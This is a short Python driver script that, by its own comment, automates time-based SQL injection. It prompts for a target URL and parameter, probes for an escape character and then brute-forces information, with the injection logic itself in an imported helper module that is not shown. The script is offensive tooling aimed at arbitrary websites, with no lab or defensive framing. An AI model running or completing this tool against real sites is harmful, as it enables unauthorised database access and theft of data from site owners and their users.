#! /usr/bin/env python3

#Code to automate time based sqli

import requests
import fun  #the file with the functions

url = input("Enter URL: ")
r = requests.get(url)
print("Status : ",r.status_code) # prints http status code to check if the site is up

param = input("Enter URL parameter :") #The parameter to be used while injecting

character = fun.escape(url,"?"+param)
print(character)
if not character :
    print("Unable to execute sql inections")
else :
    print("Trying to bruteforce information")
    fun.bruteforce(character)



